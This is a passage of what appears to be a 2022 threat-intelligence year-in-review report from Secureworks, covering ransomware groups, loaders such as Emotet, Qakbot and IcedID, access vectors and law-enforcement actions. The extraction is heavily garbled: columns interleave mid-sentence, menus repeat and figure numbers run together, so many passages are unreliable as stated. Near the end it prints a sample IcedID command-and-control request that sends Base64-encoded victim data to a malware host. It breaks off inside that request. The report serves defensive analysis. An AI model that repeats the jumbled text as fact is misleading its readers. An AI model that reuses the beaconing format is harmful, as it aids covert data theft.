2022
State of 
the ThreatAY EA RI NR EVIE WTable of 
Contents0305071731
36566465Letter From Our Chief Threat Intelligence Officer (CTIO)Executive Summary and Key FindingsRansomware Remains the Primary Strategic ThreatRansomware Enablers: Loaders and InfostealersExploitation of Remote Services is Now the Most Common Access VectorHostile Government\-Sponsored Actor Activity Shows a Regional FocusDefense Evasion Offers Its Own Detection OpportunitiesConclusionThe Secureworks View of the Threat2022 State of the Threat: A Year in Review2Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional Focus01
A Letter From Our Chief 
Threat Intelligence OfficerThe last twelve months have featured a series of headline\-grabbingthe Secureworks Incident Response team, this combines to createcybersecurity events. In December 2021, disclosure of a vulnerability inone of the most comprehensive views of the threat landscape in thethe popular Log4j software caused global panic as IT teams scrambledindustry.to find and patch vulnerable systems. In early 2022, the Russianmilitary build\-up on the Ukrainian border and subsequent invasionThe purpose of this report is to share our view on how the threatraised the specter of disruptive cyberattacks that might spill beyondlandscape has evolved over the last twelve months, with a clearUkraines borders, as happened with NotPetya in 2017\. And in mid\-April,focus on our first\-hand observations of threat actor tooling andConti ransomware knocked offline several Costa Rican governmentbehaviors. The report reviews changes in the ransomware landscape,institutions, severely disrupting their ability to effectively deliver publicand in the behavior of threat actors enabling ransomware groupsservices.with malware like loaders and stealers. It surveys significant activityby major government\-sponsored threat groups. And it examines howOur job is to dig beneath these headlines to understand the nature ofthreat actors move swiftly to exploit new vulnerabilities, and how theythe threat and mitigate the risk to our customers. We do that throughcombine sophisticated with more basic techniques to evade detectionDefense Evasion Offers Its 
Own Detection Opportunitiesup\-to\-date threat intelligence that is fueled by data\-driven detectionby defenders once inside the network. The report concludes byand analysis. The Secureworks Counter Threat Unit (CTU) continuesexamining how Taegis forms the backbone of this visibility.ConclusionThe Secureworks
View of the Threatto analyze trillions of security events every week, gathered from itsTaegis XDR platform. Together with the data processed through theAcross Secureworks, different teams work together to protect ourTaegis Vulnerability Detection and Response (VDR) solution, proactivecustomers. Our CTU research teams invest countless hours inresearch, and insights gathered through engagements carried out bydeveloping an understanding of the threat and how it might manifest,010203040506
0607070808
092022 State of the Threat: A Year in Review3and then in building ways to detect that threat which can be appliedHuman expertise works with the technical excellence of Taegis XDRto our Taegis XDR and VDR platforms. Our Security Operations teamsand Taegis VDR to keep Secureworks customers safe on their securityact as the watchful guardian of our customer networks, monitoringjourney. We hope the insights embodied in this report help you toconstantly for any changes that might indicate malicious activity. Ourprotect your organization.Incident Response team stands ready to support customers throughthe provision of proactive training, to help them prepare; and throughreactive support to investigate, contain and remediate where breachesdo occur. And our Secureworks Adversary Group emulates adversarybehaviors to help customers test how their control frameworks performin realistic, intelligence\-driven scenarios.Barry HensleyChief Threat Intelligence Officer
Secureworks010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review402
Executive 
Summary and 
Key FindingsOver the past year, cybersecurity events have been heavily influencedby escalating tensions in eastern Europe and the Middle East, a steadystream of critical vulnerabilities forcing organizations to scramble topatch their systems, and public leaks exposing the inner workings oforganized cybercriminal ransomware gangs.The role of the Secureworks Counter Threat Unit is to maintain anunderstanding of these diverse threats and apply that understandingto inform and protect customers. Between the end of June 2021and June 2022, based on insights from customer telemetry, incidentresponse, underground monitoring, proactive threat research andintelligence relationships, CTU researchers observed the followinghigh\-level trends across the threat landscape:010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review5010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic Threat01Ransomware remains the primary threat facingorganizations. Detection strategies should focus on04Based on learnings1from Secureworks incident responseengagements, exploitation of remote services hasidentifying ransomware precursors during the 'detectionreplaced credential\-based access as the mostwindow' between initial access and ransomwarecommon initial access vector, stressing the need fordeployment. The median detection window in 2022 is foureffective vulnerability management and prioritization.and a half days.Ransomware Enablers: 
Loaders and Infostealers02There has been flux in the loader landscape, withthe disappearance of some established loaders and05Nation\-state activity has been heavily focused onregional considerations. Notable examples includeExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threatthe emergence of new ones. As the malware thatRussia's cyber operations in support of the invasion ofloads second\-stage payloads like ransomware, loadersUkraine, disruptive reciprocal attacks likely conducted byform a key component of the ransomware ecosystem.Iranian and Israeli proxy actors, and China's continuedThere is evidence of close collaboration betweenfocus on the South China Sea and East Asia.the groups operating these loaders, and signs of apossible shift towards lightweight, disposable loadersin place of the complex botnets that up until now haveprovided this loader capability.03Infostealers provide the means to quickly and easily obtaincredentials that can be used for initial access, making thema major enabler of ransomware operations. On a single dayin June 2022, CTU researchers observed over two millioncredentials obtained by infostealers available for sale onjust one underground marketplace. Innovative distributionmethods for infostealers have included cloned websites andtrojanized installers for messaging apps such as Signal.06Defense evasion is a feature of many networkintrusions. However, the techniques used aregenerally not very sophisticated, because theydo not need to be. This provides additional detectionopportunities.2022 State of the Threat: A Year in Review6010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat03
Ransomware Remains the
Primary Strategic ThreatThe composition of the global ransomware landscape and the numberAnalysis of Secureworks incident response engagements for May andof victims continue to fluctuate. Yet overall, despite a series of high\-June 2022 appears to suggest that the rate at which new, successfulprofile law enforcement interventions and public leaks, ransomwareransomware attacks are happening is reducing, although it is too earlyoperators have maintained high levels of activity.to say if this is trend will continue.MAY 2021DarkSide afliate ransomware 
attacks Colonial PipelineJUNE 2021U.S. Department of Justice (DOJ) 
recovers $2\.3 million USD of the 
Colonial Pipeline ransomAUGUST 2021DarkSide group 
rebrands as 
BlackMatter 
following 
post Colonial 
Pipeline hiatusOCTOBER 2021APRIL 2022REvil shuts down following law 
enforcement operationLaw enforcement takedowns of 
popular underground platforms Raid 
Forums and Hydra MarketFEBRUARY 2022Conti Leaks provide insight 
into inner workings of the 
groupJUNE 2022Conti operation 
shut downImage PlaceholderMARCH 2022JULY 2021AUGUST 2021TrickBot 
abandonedKaseya ransomware 
attack by REvil afliateConti playbook leaks 
describe operating 
methodology of Conti 
afliateAPRIL 2022REvil briey 
returnsNOVEMBER 2021Emotet resurrected after January 
2021 law enforcement takedownJUNE 2021DOJ unseals indictment of 
Alle Max Witte, a developer 
of TrickBot malware, a key 
ransomware enablerFigure 1\. Key developments in the ransomware landscape, June 2021 \- June 2022\. (Source: Secureworks)2022 State of the Threat: A Year in Review7The demise of GOLD ULRICK's2 Conti ransomware\-as\-a\-serviceservices after the event. And some ransomware gangs may haveoperation could account for some of this reduction, but not all. Otherdecided that hitting higher numbers of smaller organizations is lessfactors influencing the rate of attacks might include the disruptivelikely to provoke a strong law enforcement response than hitting large,effect on ransomware gangs of the war in Ukraine, economic sanctionsglobal brands. Unfortunately, smaller organizations may also be lessdesigned to create friction for ransomware operators trying to cashfamiliar with the mechanism for reporting to and accessing supportin on their attacks, and the volatility of the digital currencies throughfrom law enforcement and specialist security vendors, meaning thatwhich ransomware gangs realize their profits.the true impact of ransomware will continue to be under reported andvictims will not receive the support they need.However, there could be something else going on. There is nocorresponding trend of a year\-on\-year reduction in the number ofRegardless of the overall trend, for any individual organizationorganizations listed on public ransomware leak sites (figure 2\). Andransomware remains a major threat and one that feeds on gaps inCTU researchers are investigating whether there is a general trendsecurity control frameworks. Examination of Secureworks threatin the size of those victim organizations reducing over time. Smallerresearch and incident response data provides insights into the tacticsorganizations are likely to be less well resourced, making them a softerof individual threat groups and highlights lessons that can helptarget and one that is less likely to bring in specialist incident responseorganizations better protect themselves.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 2\. Publicly listed ransomware victims by month. (Source: Secureworks)2022 State of the Threat: A Year in Review8050100150200250300350400Jan\-21Feb\-21Mar\-21Apr\-21May\-21Jun\-21Jul\-21Aug\-21Sep\-21Oct\-21Nov\-21Dec\-21Jan\-22Feb\-22Mar\-22Apr\-22May\-22Jun\-22010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatThe Window of Opportunity
for Network DefendersDuring any network intrusion, there is a window of opportunity fordefenders. This happens between the point of initial access and theencryption of data when the threat actors are consolidating theiraccess prior to achieving their ultimate objective. So far in 2022, themedian time between initial access and ransomware detonation inintrusions investigated by Secureworks incident responders is 4\.5 days,compared to 5 days in 2021\. The mean dwell time in 2021 was 22 daysbut so far in 2022 is down at 11 days, reflecting that there have beenfewer 'outliers' compared to 2021, i.e. intrusions where threat actorsspent weeks or months in an environment before deploying theirransomware.4\.5 DaysAverage (median) dwell time 
for ransomware actorsOf course, this dwell time can vary significantly. In early 2022, anorganization exposed a computer in an operational technology (OT)environment to the internet with the firewall disabled to troubleshootnetwork connectivity issues and download patches. Within five hoursthe computer had been compromised and within a further hour,the threat actors had disabled Windows Defender and deployedPhobos ransomware. While only a small number of deviceswere affected and the network was isolated from the rest of theorganization, the intrusion was sufficient to temporarily disruptbusiness operations at that location.In contrast, analysis of a Lorenz ransomware attack in September2021 showed that the threat actors, tracked by CTU researchers asGOLD LOUNGE3, had access for almost a year. The initial intrusionlikely occurred in October 2020, with GOLD LOUNGE periodicallyre\-accessing the compromised environment to run reconnaissancecommands, occasionally rotating the remote IP address theyconnected in from. They made extensive use of SMBExec to movelaterally to other hosts within the environment. In September 2021,GOLD LOUNGE staged Lorenz ransomware in the SYSVOL directory ofseveral compromised domain controllers and created scheduled taskswith random names on target systems to download and execute theransomware. They then deleted volume shadow copies and clearedthe security event log. One hypothesis to explain this lengthy delay isthat GOLD LOUNGE purchased access from an initial access broker(IAB) long after the IAB first obtained it.Regardless of the length of the detection window, network defenderscan and should exploit it. On numerous occasions, Taegis XDRcountermeasures have alerted customers to ransomware precursorsin their environment, allowing them to isolate impacted hosts, blockthe command\-and\-control infrastructure, and reset compromisedcredentials before the threat actors can capitalize on the access.The difference in terms of time to recovery, total costs incurred andbusiness disruption, compared to organizations who did not spot thethreat in time, can be huge.2022 State of the Threat: A Year in Review9010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatPrevent Where You Can,
and Detect What Cant
Be PreventedUndoubtedly, the best way to protect your organizationagainst ransomware deployment is to prevent or detectthe initial breach.3%Commodity 
malware 
infection2%Drive by
download2%Phishing2%Network
miscongurationThis requires a tight focus on good, basic security hygiene.Ensure that all external and key internal systems areprotected with multi\-factor authentication (see chapter 
5 for tips on avoiding pitfalls).Implement a timely vulnerability detection and patching 
program (see more about vulnerabilities in chapter 3\).For those situations where prevention fails, visibility of 
the environment is critical. You can't protect what you 
can't see. Trying to develop that visibility after you've 
identified a breach is too late.Deploy a comprehensive monitoring and detectionsolution on all endpoints, network, and cloud (see the 
appendix for important monitoring considerations).39%Credentials52%Exploitation of 
remote servicesFigure 3\. Initial access vectors for ransomware incidents, June 2021 \- June 
1\. (Source: Secureworks)2022 State of the Threat: A Year in Review10010203040506
0607070808
09Letter From Our CTIONew Players, Old PlayersExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatDuring the reporting period new ransomware groups appeared, manyonly briefly or with little impact, while others apparently disappeared.In some cases, this fluctuation represented a rebrand by establishedransomware groups, possibly to minimize law enforcement and mediascrutiny, and in some cases to disguise their identity in response tofinancial sanctions. In others, it may have been a result of the shiftingallegiance of affiliates in the hunt for more victims and greaterrevenues.Jul. 2021Aug. 2021Sept. 2021Oct. 2021Nov. 2021Dec. 2021Jan. 2022Feb. 2022Mar. 2022Apr. 2022May 2022Jun. 2022TOTALLockBitContiBlackCat
ALPHVHiveAvosLockerVice SocietyGriefBlackByteBlack BastaLorenzREvil5623158311411762719534228328286773865381041812391967152101354361516941163451112748817634249399873212131054944332551741163711215151052272451551112218187543613412981796965512822Figure 4\. Major ransomware schemes active during the period, showing number of victims per month. (Source: Secureworks)2022 State of the Threat: A Year in Review11010203040506
0607070808
09Letter From Our CTIOLaw Enforcement ActionsExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatOver the reporting period, there have been several significant lawenforcement actions or sanctions aimed at disrupting ransomwareoperators or their access to supporting services such ascryptocurrency money laundering.U.S. Treasury OFAC sanctions4 in December 2019targeting GOLD DRAKE5, also known as Evil Corp, haveled to the threat group repeatedly changing ransomwarevariants to complicate attribution of their attacks back tothem, so that victims do not find themselves prohibitedfrom paying the ransom. During the reporting period, theyswitched between several ransomware families includingWastedLocker, Macaw, and potentially also LockBit6\.In April 2022, OFAC sanctioned Hydra Market (Hydra),the world's largest darknet market.OFAC identified thatapproximately $8 million in ransomware proceeds had beenlaundered through it. It also sanctioned Garantex, a virtualcurrency exchange registered in Estonia thought to haveprocessed transactions worth nearly $6 million from GOLDULRICK's Conti operation.In May, OFAC sanctioned virtual currency mixer7 Blender.io (Blender), which had allegedly obscured transactions forRussian cybercrime groups including GOLD ULRICK andGOLD BLACKBURN8, and for North Korean threat actors.Also in May9, the U.S. State Department offered a financial 
reward for information leading to the arrest of seniormembers of the Conti ransomware operator.Legal action aimed at ransomware actors over the period included theDepartment of Justice's partial seizure from a Darkside affiliate of theransom paid by Colonial Pipeline; the multi\-country operation that tookcontrol of REvil servers in October, forcing them offline, and operatorGOLD SOUTHFIELD into hibernation; and the arrest in Russia ofindividuals associated with the REvil ransomware\-as\-a\-service (RaaS)operation in January.Action aimed at supporting services included the U.S. Departmentof Justice unveiling10 an indictment filed in 2020 against Latviannational Alla Witte for her role as a malware developer in the operationof TrickBot. Chats contained in the Conti Leaks11 showed GOLDBLACKBURN allocating funds for finding a lawyer to represent Witte.RaidForums, used to sell databases containing billions of card andbanking details, as well as login credentials, also closed in April, as theresult of Operation TOURNIQUET12, a complex law enforcement effortcoordinated by Europol. The site was closed, its infrastructure seized,and its administrator and his accomplices arrested.The long\-term impact of increased law enforcement activity againstransomware operators remains difficult to judge. The process ofhaving to re\-brand undoubtedly introduces cost for ransomwareactors, including potentially through the loss of affiliates to other RaaSschemes. And many victims do hesitate to pay ransoms to sanctionedgroups. However, ransomware groups have shown an ability torecover from disruptive interventions and identify alternative meansof sustaining their operations. The lack of cooperation from countrieswhere core members of the prominent ransomware groups residecontinues to hamper disruption efforts.2022 State of the Threat: A Year in Review12010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatGOLD MYSTIC's13 LockBit RaaS was the most active name\-and\-of the group were still in custody20\. This could indicate that theshame operation, listing 875 victims on its public leak site by the endindividuals had been quietly released prior to that point, or perhaps theof June 2022\. Secureworks incident responders have responded toarrests were of fringe members and had no real impact on the group'sLockBit intrusions against organizations in the technology, businessoperational capabilities. The timing also coincides with the breakdownservices, media, finance, and legal sectors across the Middle East,of cooperation between Russia and the U.S. on cybercrime.Europe, the U.S Asia, and Australia. GOLD MYSTIC appears to havebeen highly effective at recruiting affiliates from other RaaS schemes,and in at least one case CTU researchers were able to link a July 2021LockBit incident to a June 2021 REvil incident, assessing with moderateconfidence that the same affiliate was responsible for both incidentsas well as for an earlier January 2021 incident reported14 by Ahnlab.The (Non) Return of REvilOn April 19, 2022, CTU researchers observed two dormant Tor sitesassociated with REvil become active again. Both sites were redirectingto a new Tor site that appeared to be a revamp of the original REvilThe Perils of Timestamps 
Can They Be Trusted?Analysis of REvil's resurgence relied in part on analysis ofcompilation timestamps. Compilation timestamps show whena file, in this case a REvil ransomware binary, was created andcan be useful for building a timeline of threat actor activity.But they can, and often are, falsified by threat actors. Threatintelligence analysts need to be careful in relying on them.leak site. The new leak site retained the original list of victims, as wellCTU researchers have been tracking GOLD SOUTHFIELDsince 2019 and have processed thousands of REvil samples.Whenever a new version of REvil has appeared, thecompilation timestamp for the executable aligns with what isexpected of a new release. Compilation timestamps also alignfor samples across multiple different campaigns. Therefore,while compilation timestamps should generally be treatedcautiously, in this case they are a useful data point.as three new victims. This was odd, given that GOLD SOUTHFIELD15initially went offline shortly after the Kaseya attack16 that occurredover Independence Day weekend in July 2021 and then was forcedoffline permanently by a collaborative law enforcement17 effort inOctober.Naturally, the use of the same Tor infrastructure and REvil sourcecode caused speculation about whether REvil was back, despite thereported18 arrest of members of the group by the Russian FSB inJanuary 2022\. But in spite of these early signs of a resurgence, REvil isyet to reach its former level of activity.Intriguingly, CTU researchers identified19 REvil samples compiled inMarch at a time when, according to the Russian authorities, members2022 State of the Threat: A Year in Review13010203040506
0607070808
09Letter From Our CTIOALPHV Works Cross\-PlatformExecutive Summary 
and Key Findingsransomware that can be deployed across multiple operating systems.stolen credentials, the threat actors logged into domain administratorOne example is GOLD BLAZER's21 ALPHV ransomware, also known asaccounts and used the access to stage, compress, and exfiltrate files.It is increasingly common for ransomware groups to compilereconnaissance and used Mimikatz to harvest credentials. Using theseRansomware Remains the 
Primary Strategic Threatmultiple ALPHV intrusions worked by Secureworks incident responders,ALPHV is written in Rust, making the ransomware scalable acrossthe operators move from initial infection to data exfiltration within a fewWindows and Linux operating systems without needing to maintainBlackCat, which emerged in December 2021\. Based on insights fromRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threatdays, to deploying ransomware within approximately one week. In onedistinct codebases. Its configuration file (figure 5\) includes options toincident, GOLD BLAZER or one of its affiliates abused a single\-factorterminate ESXi 'vm' and 'vm snapshot' files. The hybrid approach ofauthentication Virtual Private Network (VPN) for the initial infectionlisting Linux and Windows file extensions is unusual.vector. After compromising the device, the threat actors conductedFigure 5\. ALPHV configuration file. (Source: Secureworks)2022 State of the Threat: A Year in Review14010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatHive Proves Effective
at Attracting AffiliatesDesktop Protocol (RDP) servers using compromised credentials.After conducting reconnaissance to enumerate domains and harvestcredentials using tools like PCHunter64, SharpView and Mimikatz, thegroup moves laterally using RDP with stolen credentials. The SystemBCHive is another ransomware that has featured heavily in incidentproxy tool is used to disguise network traffic and Cobalt Strike Beaconresponse engagements worked by Secureworks during the period. Theis installed across number hosts for command and control. The groupoperators of the Hive RaaS, GOLD HAWTHORNE22, have been activeexplores directories and views specific files before using FileZilla forsince at least June 2021\.data exfiltration and then ultimately deploying the Hive ransomware viaGroup Policy Object or Scheduled Task (figure 6\).Since April 2022, CTU researchers have attributed a series of Hive\-related intrusions to a single affiliate, GOLD MATADOR23\. GOLDMATADOR gains access to networks through VPN or RemoteFigure 6\. Scheduled Task (veeamupdate) used by GOLD MATADOR to detonate Hive ransomware. (Source: Secureworks)2022 State of the Threat: A Year in Review15Experimentation With
Hack and Leak ContinuesThe Secureworks 2021 State of the Threat report highlighted hack andleak incidents (where no ransomware was deployed) as a potentialshift away from the traditional ransomware\-based extortion model. Itremains unclear whether this approachprovides a viable long\-termGOLD TOMAHAWK intrusions typically start with access throughinternet\-facing VPN endpoints, likely leveraging vulnerabilities or weakor stolen credentials. Once inside the network, GOLD TOMAHAWKdoes not deploy custom tooling, relying instead on off\-the\-shelftools and applications, often native to the victim system, to meet itsobjectives. The threat group has been observed to use RDP for lateralmovement, AnyDesk for remote access, 7\-Zip to compress data forextraction, and the Mega and QuickPacket file\-upload services forbusiness model, but some groups such as GOLD TOMAHAWK24continue to practice it. Also known as Karakurt Team or Karakurt Lair,exfiltration.GOLD TOMAHAWK has been active since mid\-2021\.Another hack and leak actor that emerged during the period isthe GOLD RAINFOREST25 (Lapsus$) threat group, who claimedresponsibility for several high\-profile breaches including againstMicrosoft, Samsung and Nvidia. Identified members of GOLDRAINFOREST dont match the typical stereotype of Russian\-organizedcybercriminals. But the success they were able to achieve in ashort space of time is a cautionary tale about the importanceof understanding how easy it can be for threat actors with amoderate level of capability and, critically, a means of accessing anorganization's network to carry out attacks.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 7\. GOLD TOMAHAWK (Karakurt) leak site screenshot.
(Source: Secureworks)2022 State of the Threat: A Year in Review1604
Ransomware Enablers: 
Loaders and InfostealersMalware distribution forms a key component of the broad infrastructurethat both supports and fuels the ransomware ecosystem. Deliverytechniques continue to evolve, and the relationship betweenestablished ransomware operators and malware distribution operatorsremains a close one.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review17010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsNow You See Them,
Now You Don'tBetween July 2021 and June 2022, two big names in the loaderlandscape disappeared and two returned, demonstrating that writing offbotnets and their associated malware, even after periods of inactivity,Ransomware Remains the 
Primary Strategic Threatcan be premature.Emotet returned in November 2021, following its January 2021takedown by international law enforcement agencies. During thisdowntime, its developers, tracked as the GOLD CRESTWOOD26threat group, had made some changes. The Emotet code appearedenhanced and streamlined, with more modern cryptography, differentcommunications protocols, a switch to 64\-bit architecture, morecustomizable execution options, and new command and control(C2\) infrastructure. CTU researchers also observed evidence ofGOLD CRESTWOOD experimenting with re\-implementing deprecatedfunctionality such as modules to steal credit card information fromweb browsers and self\-propagation27 using SMB and a list ofhardcoded credentials.Ransomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatConti operator GOLD ULRICK was likely instrumental28 in Emotetsreturn, and the Conti Leaks provided evidence of the close relationshipbetween the ransomware group and GOLD CRESTWOOD. Emotetreappeared as a DLL download from TrickBot, suggesting that GOLDCRESTWOOD aimed to rebuild the Emotet botnet by using long\-timecollaborator GOLD BLACKBURN's TrickBot infrastructure. Emotet wasalso distributed through malicious Windows App Installer packagesdisguised as Adobe PDF software, much like GOLD BLACKBURN'sBazarBackdoor malware. In January 2022, CTU researchers observedEmotet executing reconnaissance commands (see figure 8\) replacingfunctionality that was previously provided by intermediate payloadsQakbot and TrickBot.Figure 8\. Emotet executing reconnaissance commands and credential\-theft 
tools. (Source: Secureworks)2022 State of the Threat: A Year in Review18010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatIn March, Emotet resumed dropping Qakbot, using the 'azd' QakbotThe TrickBot botnet stopped responding to infected systems oncampaign ID which likely refers to a GOLD LAGOON29 affiliate.March 1, 2022, after a progressive decrease since mid\-2021 in theQakbot had itself taken a two\-month hiatus in 2021, reappearing ontempo of updates to TrickBot\-infected hosts via its C2 infrastructure.September 9, 2021\. During the break, Qakbot's backend infrastructureThere were no signs of it returning to life by August, and it seems likelywas for the first time switched off rather than left to idle, leading thethat the group intends to permanently abandon it.security community to question if the hiatus could be permanent.Since its return, Qakbot has resumed its role as a major player in theloader landscape.On October 18, CTU researchers observed Qakbot deploying a newplugin containing the legitimate Atera remote management andmonitoring (RMM) software to all infected devices (figure 9\).Figure 9\. msiexec.exe launching the Windows installer file that installs the Atera 
RMM software. (Source: Secureworks)OCTOBER 19, 2021DECEMBER 20, 2021FEBRUARY 20, 2022MARCH 1, 2022Last C2 server update to 
botnet segment 
2000000Last plugin
updateAspects of C2
infrastructure start
going ofineC2 infrastructure 
completely disabledJULY 31, 2021Last C2 server update to 
botnet segment 
1000000DECEMBER 6, 2021DECEMBER 29, 2021FEBRUARY 27, 2022Web injects 
disabledLast observed 
TrickBot spam 
campaignConti data 
leaks beginFigure 10\. Timeline of TrickBot activity from July 2021 through March 2022\. (Source: Secureworks)2022 State of the Threat: A Year in Review19010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatThe Conti Leaks may shed some light on the decision to abandonDistribution for IcedID also changed during 2021, to distribute ISO filesTrickBot, as they include conversations about TrickBot's declining utilitycontaining Windows shortcut (LNK) files that execute a colocatedand BazarLoader's increasing maturity. In a sign of the speed withDLL file containing the IcedID payload. In a March 2022 intrusion, anwhich the threat landscape can change, by April 2022 a new loaderattacker compromised an internet\-facing Microsoft Exchange Servercalled Bumblebee was being used in Conti and Diavol ransomwarevia the ProxyShell vulnerability and used access to the compromisedattacks in preference to BazarLoader. However, TrickBot's designserver to send internal phishing emails containing hijacked emailmeans GOLD BLACKBURN retains the capability to re\-enable the C2threads and an attached IcedID payload. This technique of usinginfrastructure and recapture existing bots if the group chooses to.compromised email servers to send internal phishing emails is likelyThere were lulls in IcedID activity between July and Novemberbypassing security controls that warn users by tagging emails that2021, and between February and May 2022, but activity levels haveoriginate externally.an effort to ensure that emails appear to come from a trusted sender,continued to increase since May 2022\. In 2021 the operators ofIcedID, GOLD SWATHMORE30, reworked the malwares networkingfunctionality to include Base64\-encoded information about the victimsystem in the HTTP Cookie and Authorization header (figure 11\).POST news12550 HTTP1\.1
Host: coolbearblunts.com
Connection: Keep\-Alive
Content\-Type: applicationoctet\-stream
Cookie: session\=MDowOjA6MjIxMzQ6MA\=\=
Authorization: Basic MzU2MDE4MjYwMDOxMDg2NDczMzAyOjEwNzo2Njoy
Content\-Length: 416JjE0NDQ1MTcwPUE0QkI2RENENEExMyYyMDg0NzgwOT01NDQ1MDA1NDU1MDA1NTM1MDA1NEI1MDA1NTQ1MDA1 
NEY1MDAINTAIMDA]MkQIMDAINTIIMDA]MzMIMDAINTUIMDAIMZEIMDA]MzkIMDAIMzMIMDAmMzMONTk5NTg9 
JTU3JTAwJTRGJTAwJTUyJTAwJTRCJTAwJTQ3JTAwJTUyJTAwJTRGJTAwJTU1JTAwJTUwJTAwJjUzOTU4OTQ5 
PTMmMTg2NzkwOTM9MCY1NTA5MDkyNz@xMC4wLjE5MDQLjAuNjQuMS400CYONDMANTY10D01NKE1MDAINjM1 
